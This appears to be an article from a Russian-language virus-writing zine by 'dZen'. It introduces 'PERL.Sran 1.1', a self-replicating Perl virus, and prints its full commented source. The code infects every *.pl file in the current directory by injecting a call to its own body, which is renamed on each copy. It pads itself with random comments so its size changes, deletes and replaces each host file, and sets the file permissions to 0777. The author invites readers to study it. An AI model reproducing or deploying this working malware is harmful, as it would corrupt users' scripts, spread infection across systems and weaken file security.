
▐█ █▐▀█▄▐▀█ ▀▐▀▀▌▀█▄▐▀▀▌    ▄▄▄█▀█
 █ █▐  █▐▄█▌█▐  ▄  █▐       █▄▄▄▄    ▄     Вирусы и Perl
 █▄█▐▄▄█▐  █▐▐  █▄▄█▐       ▀   ▀█  
▐█ █▐▄ █▐▄██▐▐▄ █▄ █▐▄      ▀█▄▄█▀   ▀     (c) dZen
==============================================================================


 PERL.Sran 1.1

   Это  творение больной фантазии пытается заразить все *.pl файлы в текущей
 директории, записываясь в их конец. Если файл уже заражен (метка), то вирус
 его не трогает.  Думаю, что название вируса говорит само за себя :) Я не пы-
 тался написать что-то, что могло бы по-настоящему жить - все это просто так. 
   Главное извращение здесь - это попытка от заражения к заражению менять раз-
 мер тела вируса.  Реализуется  это  банальным  расставлением комментариев по
 всему телу нашего зверька.
   Все работы на перле, которые я видел имели примерно одинаковый способ зара-
 жения:  записывали  себя  в начало файла, за собой оставляя само тело жертвы.
 Пытаясь пойти дальше,  я  снова  попытался  выпендриться  и  закосил под уже
 ассемблерный способ: сначала jmp на тело вируса, после которого возвращается
 управление основному коду. Получилось очень даже мило :)
   Во второй версии (а это она и есть) я несколько подправил код. Теперь если
 наш файл запускает root, то мы быстренько отдаем управление зараженному файлу.
 Это так, для перестраховки :) Плюс некоторые косметические улучшения. Короче,
 это и второй версией-то с нятяжкой не назовешь.  В  общем, как слово Срань не
 склоняй, а смысл один...
   Изучайте на здоровье :)

P.S И да пребудет с вами Сила :))

=========================================кут хере================================================

#!/usr/bin/perl -X
#!Sran							#Метка зараженности файла

qwerty();						#Имя процедуры, под которой будет находиться
							#наш вирус .. она меняется от заражения к заражению

sub qwerty {

    goto b if($ENV{"USER"} eq "root");			#Если нас запустил root - быстро на выход
    
a: while (<*.pl>)					#Искать все *.pl файлы в текущей директории
    {
	my $oF = "qwerty";				#Имя функции, под которой находится вирус (старая)
	my $tN = crypt($_, $_), $cW = 0; $oN = "./$_", $nF = $tN;	#Переменные для дальнейшей работы

	open (WE, "<$0");				#Открыть себя для чтения
	open (IF, "<$_");				#Открыть заражаемый файл для чтения
	open (TMP, ">$tN");				#Создать temp-файл	
	
	    $nF =~ s/[0-9.\/].*/a/;			#Генерим имя новой функции .. и она не должна
							#начинаться с цифры
	
	    while (<IF>) 				#Пробегаемся по заражаемому файлу
	    {
		chomp;					#Отсекаем от считанной строчки переход на новую строку
							#"\n" - кто не знал :)
		if (/\#!Sran/) { unlink ($tN); next a }	#Если есть метка заражения - ищем другой файл	
		elsif (!/#!\//) { print TMP "$_\n" }	#Если строка не начинается с символов "#!" - записываем ее
							#(строчку эту) в темп файл
		else { if(!/-X/){$_ .= " -X"} print TMP "$_\n#!Sran\n$nF();\n" } #Если строчка начинается с тех
							#самых символов, то добавить к ней флаг "-X" (кто не знает
							#что это, читайте документацию) + пишем метку зараженности	
	    }
	    
	    while (<WE>)				#Пробегаемся по фалу, в котором мы находимся (по хосту)
	    {
		$st = "";
		
		s/#[\d].*/$st/;				#В переменную $st добавляем сгениренный от балды комментарий
		if (/sub $oF/ || /my \$oF =/) { $cW = 1; s/$oF/$nF/}	#Заменяем имя старой функции (той, по которой 
							#мы себя вызвали) на новосгенеренную
		next if (/#!\// || /$oF();/ || !$cW);	#Едем дальше, если встретили "#!" или вызов функции (старое имя)
		if (int(rand(2))) { $st=" #".crypt($tN, rand(256)) } #Ставим коммент от балды (вероятность 1 к 2)
		else {$st = ""}				#Иначе едем дальше (и чистим переменную, содержащую комментарий)
		
		chomp;
		print TMP "$_$st\n";			#Пишем строчку в темп файл
	    }
	
	unlink ($oN);					#Удаляем заражаемый файл
	rename ($tN, $oN);				#Переименовываем темп файл в старый (теперь он такой же, тока заражен)
	chmod (0777, $oN);				#И ставим ему аттрибуты 777 (все)
    }
b:
}

========================================кут хере=================================================
